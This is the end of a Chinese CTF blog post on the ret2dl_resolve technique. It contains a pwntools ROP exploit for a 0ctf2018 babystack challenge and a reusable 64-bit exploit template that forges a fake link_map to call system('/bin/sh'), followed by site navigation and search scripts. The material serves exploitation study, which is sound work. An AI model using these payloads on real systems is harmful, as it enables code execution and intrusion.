+payload<span class="token operator">=</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>plt0<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"something:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>fake_link_map<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>模板：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=UTF-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+
+plt0<span class="token operator">=</span>elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
+
+l_addr<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+<span class="token comment">#__libc_start_main此时为一个已解析函数，取它与system的偏移为l_addr</span>
+
+st_value<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+<span class="token comment">#value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);</span>
+
+fake_link_map<span class="token operator">=</span>get_fake_link_map<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">,</span>l_addr<span class="token punctuation">,</span>st_value<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_fake_link_map</span><span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">,</span>l_addr<span class="token punctuation">,</span>st_value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#各个指针的伪造地址</span>
+    fake_Elf64_Dyn_STR_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span>
+    fake_Elf64_Dyn_SYM_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span>
+    fake_Elf64_Dyn_JMPREL_addr<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#伪造结构体</span>
+    fake_Elf64_Dyn_SYM<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>st_value<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    fake_Elf64_Dyn_JMPREL<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token comment">#JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span>
+	
+    r_offset<span class="token operator">=</span>fake_link_map_addr<span class="token operator">-</span>l_addr
+    fake_Elf64_rela<span class="token operator">=</span>flat<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#fake_link_map整体结构</span>
+    fake_link_map<span class="token operator">=</span>flat<span class="token punctuation">(</span>	<span class="token comment">#0x0</span>
+        p64<span class="token punctuation">(</span>l_addr<span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">#0x8</span>
+        fake_Elf64_Dyn_SYM<span class="token punctuation">,</span>	<span class="token comment">#0x18</span>
+        fake_Elf64_Dyn_JMPREL<span class="token punctuation">,</span>	<span class="token comment">#0x28</span>
+        fake_Elf64_rela<span class="token punctuation">,</span>	<span class="token comment">#0x40</span>
+        <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span>	<span class="token comment">#凑齐0x68，开始放指针</span>
+        fake_Elf64_Dyn_STR_addr<span class="token punctuation">,</span>  <span class="token comment">#STRTAB指针，0x70</span>
+        fake_Elf64_Dyn_SYM_addr<span class="token punctuation">,</span>	<span class="token comment">#SYMTAB指针，0x78</span>
+        <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        fake_Elf64_Dyn_JMPREL_addr<span class="token punctuation">,</span>	<span class="token comment">#JMPEREL指针</span>
+    <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> fake_link_map
+
+fake_link_map<span class="token operator">=</span>get_fake_link_map<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">,</span>l_addr<span class="token punctuation">,</span>st_value<span class="token punctuation">)</span>
+<span class="token comment">#获得伪造的link_map</span>
+
+payload<span class="token operator">=</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/03/24/Kernel-UAF/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-29 17:24:15
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/stack/" title="stack">
+                        #stack
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/29/House-of-Orange/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dl-resolve"><span class="toc-text">ret2dl_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%EF%BC%9A"><span class="toc-text">延迟绑定技术：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8Dret2dl-resolve"><span class="toc-text">32位ret2dl_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-text">介绍：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9A"><span class="toc-text">涉及的结构体：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">注意点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0ctf2018-babystack"><span class="toc-text">0ctf2018-babystack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%EF%BC%88%E6%A8%A1%E6%9D%BF%EF%BC%89%EF%BC%9A"><span class="toc-text">exp（模板）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8Dret2dl-resolve"><span class="toc-text">64位ret2dl_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9A-1"><span class="toc-text">涉及的结构体：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%EF%BC%88%E6%A8%A1%E6%9D%BF%EF%BC%89%EF%BC%9A-1"><span class="toc-text">exp（模板）：</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ret2dl_resolve + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F29%2Fret2dl-resolve%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/29/ret2dl-resolve/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
